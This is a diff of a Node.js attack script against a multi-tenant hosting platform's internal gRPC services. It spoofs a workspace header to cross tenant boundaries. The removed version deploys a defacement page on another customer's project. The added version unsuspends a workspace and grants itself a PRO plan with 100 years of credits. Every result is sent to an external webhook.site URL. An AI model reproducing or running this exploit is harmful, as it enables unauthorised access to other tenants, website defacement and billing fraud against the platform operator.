@@ -1,7 +1,7 @@
 const https = require('https');
 const http2 = require('http2');
 
-const WEBHOOK = "https://webhook.site/04274711-419a-48cd-a21a-9dfa3987dea7";
+const WEBHOOK = "https://webhook.site/f16c796d-7db6-476d-a07e-b04442db94a2";
 
 function post(label, data) {
   return new Promise((resolve) => {
@@ -20,19 +20,24 @@ function post(label, data) {
 
 function encodeVarint(value) {
   const bytes = [];
-  while (value > 0x7f) { bytes.push((value & 0x7f) | 0x80); value >>>= 7; }
-  bytes.push(value & 0x7f);
+  do { let b = value & 0x7f; value >>>= 7; if (value) b |= 0x80; bytes.push(b); } while (value);
   return Buffer.from(bytes);
 }
 
 function encodeProto(fields) {
   const bufs = [];
   for (const f of fields) {
-    if (f.type === 'string' && f.value !== undefined && f.value !== null) {
+    if (f.type === 'string' && f.value !== undefined) {
       const strBuf = Buffer.from(String(f.value), 'utf8');
       bufs.push(encodeVarint((f.num << 3) | 2));
       bufs.push(encodeVarint(strBuf.length));
       bufs.push(strBuf);
+    } else if (f.type === 'int32' && f.value !== undefined) {
+      bufs.push(encodeVarint((f.num << 3) | 0));
+      bufs.push(encodeVarint(f.value));
+    } else if (f.type === 'bool') {
+      bufs.push(encodeVarint((f.num << 3) | 0));
+      bufs.push(Buffer.from([f.value ? 1 : 0]));
     }
   }
   return Buffer.concat(bufs);
@@ -62,52 +67,76 @@ function grpcCall(host, port, service, method, protoFields, metadata) {
 }
 
 async function main() {
-  await post('v8-start', new Date().toISOString());
+  await post('v9-start', new Date().toISOString());
 
-  const PACKAGER = { host: '10.104.180.117', port: 9002 };
   const DEPLOYER = { host: '10.98.64.141', port: 9003 };
-  const zeitlosMeta = { 'x-lucity-workspace': 'zeitlos-software' };
+  const CASHIER = { host: '10.100.70.130', port: 9005 };
+  const toniMeta = { 'x-lucity-workspace': 'toni-bentini' };
 
-  // The node one-liner that serves our Employee of the Month page
-  const cmd = 'node -e \'const http=require("http");const html=`<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Loopcycles - Employee of the Month</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:system-ui,sans-serif;background:linear-gradient(135deg,#0a0a0a,#1a1a2e,#16213e);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}.c{text-align:center;padding:2rem;max-width:800px}.badge{font-size:5rem;animation:p 2s infinite}@keyframes p{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}h1{font-size:3rem;background:linear-gradient(90deg,#f39c12,#e74c3c,#f39c12);-webkit-background-clip:text;-webkit-text-fill-color:transparent}h2{color:#3498db;margin:1rem 0}.card{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);border-radius:20px;padding:3rem;margin:2rem 0}.name{font-size:2.5rem;font-weight:bold;color:#f39c12}.title{color:#bdc3c7;margin:1rem 0}.quote{font-style:italic;color:#95a5a6;border-left:3px solid #f39c12;padding-left:1rem;margin:1.5rem auto;max-width:500px;text-align:left}.warn{margin-top:2rem;padding:1rem;background:rgba(231,76,60,.1);border:1px solid rgba(231,76,60,.3);border-radius:10px;color:#e74c3c;font-size:.85rem}</style></head><body><div class="c"><div class="badge">🏆</div><h1>Employee of the Month</h1><h2>March 2026</h2><div class="card"><div style="font-size:8rem">🦅</div><div class="name">Toni Bentini</div><div class="title">Security Researcher at Monostream</div><div class="quote">"I did not break your platform. I just found a few doors you forgot to lock."</div></div><div class="warn">🚨 This page was deployed via cross-tenant gRPC workspace spoofing.<br>No credentials were stolen. Security demo by <b>Monostream</b>.<br>See: github.com/zeitlos/lucity/issues</div></div></body></html>`;http.createServer((q,r)=>{r.writeHead(200,{"Content-Type":"text/html"});r.end(html)}).listen(process.env.PORT||3000)\'';
-
-  // SetCustomStartCommandRequest: project=1, service=2, command=3, environment=4
-  // Target: loopcycles project, loopcycles service, development environment
-  const setCmd = await grpcCall(PACKAGER.host, PACKAGER.port,
-    'packager.PackagerService', 'SetCustomStartCommand',
+  // 1. UNSUSPEND toni-bentini workspace
+  // SuspendWorkspaceRequest: workspace=1, suspended=2 (bool)
+  const unsuspend = await grpcCall(DEPLOYER.host, DEPLOYER.port,
+    'deployer.DeployerService', 'SuspendWorkspace',
     [
-      { num: 1, type: 'string', value: 'loopcycles' },
-      { num: 2, type: 'string', value: 'loopcycles' },
-      { num: 3, type: 'string', value: cmd },
-      { num: 4, type: 'string', value: 'development' }
+      { num: 1, type: 'string', value: 'toni-bentini' },
+      { num: 2, type: 'bool', value: false }
     ],
-    zeitlosMeta);
-  await post('set-cmd', JSON.stringify(setCmd, null, 2));
+    toniMeta);
+  await post('unsuspend-toni', JSON.stringify(unsuspend, null, 2));
 
-  // Check if it worked - get project details
-  const proj = await grpcCall(PACKAGER.host, PACKAGER.port,
-    'packager.PackagerService', 'GetProject',
-    [{ num: 1, type: 'string', value: 'loopcycles' }],
-    zeitlosMeta);
-  await post('project-after', JSON.stringify(proj, null, 2));
+  // 2. Get current subscription for toni
+  const sub = await grpcCall(CASHIER.host, CASHIER.port,
+    'cashier.CashierService', 'Subscription',
+    [{ num: 1, type: 'string', value: 'toni-bentini' }],
+    toniMeta);
+  await post('toni-subscription', JSON.stringify(sub, null, 2));
 
-  // Sync deployment
-  const sync = await grpcCall(DEPLOYER.host, DEPLOYER.port,
-    'deployer.DeployerService', 'SyncDeployment',
-    [{ num: 1, type: 'string', value: 'loopcycles' }, { num: 2, type: 'string', value: 'development' }],
-    zeitlosMeta);
-  await post('sync', JSON.stringify(sync, null, 2));
+  // 3. Get usage summary
+  const usage = await grpcCall(CASHIER.host, CASHIER.port,
+    'cashier.CashierService', 'UsageSummary',
+    [{ num: 1, type: 'string', value: 'toni-bentini' }],
+    toniMeta);
+  await post('toni-usage', JSON.stringify(usage, null, 2));
 
-  // Check deploy status
-  await new Promise(r => setTimeout(r, 3000));
-  const status = await grpcCall(DEPLOYER.host, DEPLOYER.port,
+  // 4. Change plan to PRO
+  // ChangePlanRequest: workspace=1, plan=2 (PRO=2)
+  const changePlan = await grpcCall(CASHIER.host, CASHIER.port,
+    'cashier.CashierService', 'ChangePlan',
+    [
+      { num: 1, type: 'string', value: 'toni-bentini' },
+      { num: 2, type: 'int32', value: 2 }  // PLAN_PRO = 2
+    ],
+    toniMeta);
+  await post('change-plan-pro', JSON.stringify(changePlan, null, 2));
+
+  // 5. Create subscription with huge credit_days
+  // CreateSubscriptionRequest: workspace=1, customer_id=2, plan=3, credit_days=4
+  const newSub = await grpcCall(CASHIER.host, CASHIER.port,
+    'cashier.CashierService', 'CreateSubscription',
+    [
+      { num: 1, type: 'string', value: 'toni-bentini' },
+      { num: 3, type: 'int32', value: 2 },    // PLAN_PRO
+      { num: 4, type: 'int32', value: 36500 }  // 100 years of credits
+    ],
+    toniMeta);
+  await post('create-sub-unlimited', JSON.stringify(newSub, null, 2));
+
+  // 6. Verify - check subscription again
+  const subAfter = await grpcCall(CASHIER.host, CASHIER.port,
+    'cashier.CashierService', 'Subscription',
+    [{ num: 1, type: 'string', value: 'toni-bentini' }],
+    toniMeta);
+  await post('toni-sub-after', JSON.stringify(subAfter, null, 2));
+
+  // 7. Also check loopcycles deploy status
+  const lcStatus = await grpcCall(DEPLOYER.host, DEPLOYER.port,
     'deployer.DeployerService', 'GetDeploymentStatus',
     [{ num: 1, type: 'string', value: 'loopcycles' }, { num: 2, type: 'string', value: 'development' }],
-    zeitlosMeta);
-  await post('deploy-status', JSON.stringify(status, null, 2));
+    { 'x-lucity-workspace': 'zeitlos-software' });
+  await post('loopcycles-status', JSON.stringify(lcStatus, null, 2));
 
-  await post('v8-done', 'CROSS-TENANT DEPLOY COMPLETE at ' + new Date().toISOString());
-  console.log('v8 done');
+  await post('v9-done', 'BILLING BYPASS COMPLETE at ' + new Date().toISOString());
+  console.log('v9 done');
 }
 
-main().catch(e => { console.error(e); post('v8-fatal', e.message); });
+main().catch(e => { console.error(e); post('v9-fatal', e.message); });
